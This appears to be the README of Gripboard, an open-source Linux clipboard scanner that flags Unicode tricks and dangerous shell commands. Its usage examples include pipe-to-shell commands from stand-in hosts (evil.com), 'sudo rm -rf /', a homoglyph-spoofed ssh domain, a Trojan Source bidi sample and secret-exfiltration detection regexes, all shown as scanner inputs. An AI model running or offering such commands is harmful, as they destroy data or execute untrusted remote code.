# Gripboard

**Clipboard security scanner for Linux** — detects malicious Unicode tricks, dangerous shell commands, and obfuscated code in your clipboard before you paste.

Attackers use invisible characters, homoglyphs (Cyrillic `а` disguised as Latin `a`), bidirectional text overrides, and other Unicode tricks to sneak malicious commands into code you copy from the web. Gripboard catches them.

## Features

- **Real-time clipboard monitoring** for both X11 and Wayland
- **Unicode threat detection** — invisible characters, homoglyphs, bidi/Trojan Source attacks
- **Shell command analysis** — flags `curl | sh`, reverse shells, `rm -rf`, privilege escalation
- **32+ built-in detection rules** — reverse shells, obfuscation, exfiltration, persistence
- **Custom rule DSL** — write your own rules in TOML with regex patterns
- **Heuristic risk scoring** — 0-100 composite score from all analysis layers
- **Clipboard sanitizer** — auto-strip dangerous chars or replace homoglyphs with ASCII
- **GUI mode** — system tray icon, desktop notifications, paste confirmation dialogs
- **Per-app profiles** — strict rules for terminals, relaxed for browsers
- **Audit logging** — SQLite-backed history of every scan with stats and JSON export
- **Community rule API** — sync shared rulesets and submit new rules
- **Free and open source** (MIT)

## Quick Start

### 1. Install system dependencies

Gripboard needs a clipboard tool and GTK3 bindings from your system package manager (these can't be pip-installed):

```bash
# Arch/Manjaro
sudo pacman -S python-gobject gtk3 libayatana-appindicator xclip wl-clipboard libnotify

# Debian/Ubuntu
sudo apt install python3-gi gir1.2-gtk-3.0 gir1.2-ayatanaappindicator3-0.1 \
    gir1.2-notify-0.7 xclip wl-clipboard

# Fedora
sudo dnf install python3-gobject gtk3 libayatana-appindicator-gtk3 \
    xclip wl-clipboard libnotify
```

Only the clipboard tool for your display server is required — the rest are needed for GUI mode:

| Display Server | Required Package |
|---|---|
| X11 | `xclip` or `xsel` |
| Wayland | `wl-clipboard` |

### 2. Install Gripboard

```bash
git clone https://github.com/flyawayfpv/gripboard.git
cd gripboard
python -m venv --system-site-packages .venv
source .venv/bin/activate
pip install -e .
```

> **Note:** The `--system-site-packages` flag is required so the venv can access GTK3/GObject bindings installed by your system package manager. Without it, GUI mode will not work.

### Install with server support (optional)

```bash
pip install -e ".[server]"
```

### 3. Initialize config

```bash
gripboard init
```

Creates `~/.config/gripboard/config.toml` with sensible defaults.

### 4. Run it

```bash
# GUI mode (system tray + dialogs) — default
gripboard

# Terminal-only mode (no GUI needed)
gripboard watch

# One-shot scan
echo 'curl https://evil.com | sh' | gripboard scan
```

## Usage

### GUI mode (default)

```bash
gripboard
# or explicitly:
gripboard gui
```

Starts with a system tray icon. When you copy something suspicious, you get:
- A desktop notification with the threat level
- A confirmation dialog (for HIGH/CRITICAL threats) letting you **Block**, **Sanitize**, or **Allow**

### Terminal-only mode

```bash
gripboard watch
```

Monitors clipboard and prints warnings to stderr. No GUI needed.

### One-shot scan

```bash
# Scan a string directly
gripboard scan 'curl https://evil.com | sh'

# Scan from stdin
echo 'sudo rm -rf /' | gripboard scan

# Pipe from clipboard
xclip -selection clipboard -o | gripboard scan
```

Exit codes reflect severity: 0=clean, 1=low, 2=medium, 3=high, 4=critical.

### Audit log

```bash
# View recent scan events
gripboard log

# Filter by severity
gripboard log -s critical

# Show aggregate stats
gripboard log --stats

# Export as JSON
gripboard log --export > audit.json
```

### Community rule sync

```bash
# Pull latest community rules
gripboard sync

# Sync and submit anonymized telemetry
gripboard sync --telemetry
```

### Autostart on login

```bash
gripboard install
```

Installs a systemd user service and XDG autostart entry. Enable with:

```bash
systemctl --user enable --now gripboard
```

### Self-hosted API server

```bash
pip install -e ".[server]"
gripboard serve --port 8000
```

## Sample Use Cases

### 1. Catch a hidden zero-width space attack

Someone posts a "helpful" command online:

```
sudo apt update && sudo apt upgrade
```

But it actually contains a zero-width space (`U+200B`) between `apt` and `upgrade`, which could cause unexpected behavior or mask a different command entirely. Gripboard catches it:

```
[GRIPBOARD HIGH] Suspicious clipboard content detected!
  Findings (1):
    [HIGH] pos 35: U+200B - Invisible character: Zero Width Space
  Risk Score: 15/100 (LOW)
```

### 2. Detect a homoglyph attack

A phishing page uses Cyrillic characters to spoof a domain:

```
ssh admin@gооgle.com    # Those 'o's are Cyrillic U+043E
```

Gripboard catches the lookalikes:

```
[GRIPBOARD HIGH] Suspicious clipboard content detected!
  Findings (2):
    [HIGH] pos 10: U+043E - 'о' (CYRILLIC SMALL LETTER O) looks like ASCII 'o'
    [HIGH] pos 11: U+043E - 'о' (CYRILLIC SMALL LETTER O) looks like ASCII 'o'
  Sanitized: "ssh admin@google.com"
```

### 3. Block a pipe-to-shell attack

A tutorial tells you to run:

```bash
curl https://some-sketchy-site.com/install.sh | sudo bash
```

Gripboard flags it as critical:

```
[GRIPBOARD CRITICAL] Suspicious clipboard content detected!
  Findings (1):
    [CRITICAL] rule:pipe-to-shell - Pipe-to-shell execution
  Risk Score: 75/100 (CRITICAL)
    - Rules: 1 match(es) = 35 pts
    - Shell: 1 command(s) = 40 pts
```

In GUI mode, a dialog pops up forcing you to explicitly allow it.

### 4. Catch a Trojan Source attack

Malicious code uses Right-to-Left Override (`U+202E`) to make code appear different than it executes:

```python
access_level = "user‮ ⁦"!= "admin"
```

This renders as checking `user` but actually compares something else entirely:

```
[GRIPBOARD CRITICAL] Suspicious clipboard content detected!
  Findings (2):
    [CRITICAL] pos 22: U+202E - Bidi control character: Right-to-Left Override
    [CRITICAL] pos 24: U+2066 - Bidi control character: Left-to-Right Isolate
  Risk Score: 60/100 (HIGH)
```

### 5. CI/CD pipeline integration

Use Gripboard in CI to scan scripts before execution:

```bash
# In your CI pipeline
gripboard scan < deploy-script.sh
if [ $? -ge 3 ]; then
    echo "BLOCKED: High-severity threat detected"
    exit 1
fi
```

## Writing Custom Rules

Create TOML files in `~/.config/gripboard/rules/`:

```toml
# ~/.config/gripboard/rules/my-rules.toml

[[rules]]
id = "my-company-domain"
description = "Blocks commands targeting internal domains"
severity = "high"
pattern = '''(curl|wget|ssh).*internal\.mycompany\.com'''
scope = "line"
tags = ["network", "internal"]

[[rules]]
id = "env-var-secrets"
description = "Detects potential secret exfiltration via env vars"
severity = "critical"
pattern = '''echo\s+\$(AWS_SECRET|DATABASE_URL|API_KEY)'''
scope = "line"
tags = ["exfiltration", "secrets"]
```

Rule fields:

| Field | Type | Description |
|---|---|---|
| `id` | string | Unique identifier |
| `description` | string | What this rule detects |
| `severity` | `low\|medium\|high\|critical` | Threat level |
| `pattern` | string | Regex pattern |
| `scope` | `full\|line\|word` | Match against entire content, per-line, or per-word |
| `tags` | list[string] | Categorization tags |
| `enabled` | bool | Toggle on/off (default: true) |
| `ignorecase` | bool | Case-insensitive matching (default: true) |

## Configuration

Edit `~/.config/gripboard/config.toml`:

```toml
[scanner]
check_ascii = true          # Flag non-ASCII characters
check_homoglyphs = true     # Detect Unicode lookalikes
check_invisible = true      # Detect zero-width/invisible chars
check_bidi = true           # Detect bidirectional control chars

[scanner.allowlist]
codepoints = ["00E9", "00F1"]  # Allow é and ñ

[notifications]
mode = "both"               # terminal, desktop, or both
min_severity = "low"        # Minimum severity for notifications

[monitor]
poll_interval = 0.5         # Clipboard check interval (X11 only)
confirm_paste = true        # Show dialog on HIGH/CRITICAL
use_profiles = true         # Enable per-app profiles

[community]
api_url = "https://api.gripboard.dev"
telemetry = false           # Opt-in anonymous telemetry
auto_sync = false           # Auto-pull community rules
```

## Architecture

```
Clipboard ──> Monitor ──> Scanner ──> Rule Engine ──> Scorer ──> Notifier
              (X11/WL)   (Unicode)    (TOML DSL)     (0-100)    (tray/dialog)
                                         │                          │
                                    Shell Parser              Audit Log
                                   (command risk)             (SQLite)
                                                                 │
                                                          Community API
                                                        (sync/telemetry)
```

## API Endpoints

When running `gripboard serve`:

| Method | Endpoint | Description |
|---|---|---|
| GET | `/health` | Health check |
| GET | `/rules` | Fetch approved community rules (JSON) |
| GET | `/rules/toml` | Fetch rules as TOML (for direct sync) |
| POST | `/rules/submit` | Submit a new rule for review |
| POST | `/telemetry` | Submit anonymized scan statistics |
| GET | `/stats` | Public community statistics |

## Project Status

**v0.1.0-alpha** — Phase 1-4 complete:

- [x] Phase 1: Core scanner (Unicode detection, CLI, config)
- [x] Phase 2: Desktop integration (tray, dialogs, sanitizer, profiles)
- [x] Phase 3: Rule engine (DSL, 32+ rules, shell parser, scoring, audit log)
- [x] Phase 4: SaaS layer (REST API, rule sync, telemetry)
- [ ] Phase 5: Web dashboard, org-wide policy management (planned)

## Contributing

Gripboard is free and open source under the MIT license. Contributions welcome.

```bash
# Dev setup
git clone https://github.com/flyawayfpv/gripboard.git
cd gripboard
python -m venv .venv
source .venv/bin/activate
pip install -e ".[dev,server]"

# Run tests
pytest -v

# Run with coverage
pytest --cov=gripboard --cov-report=term-missing
```

## License

MIT
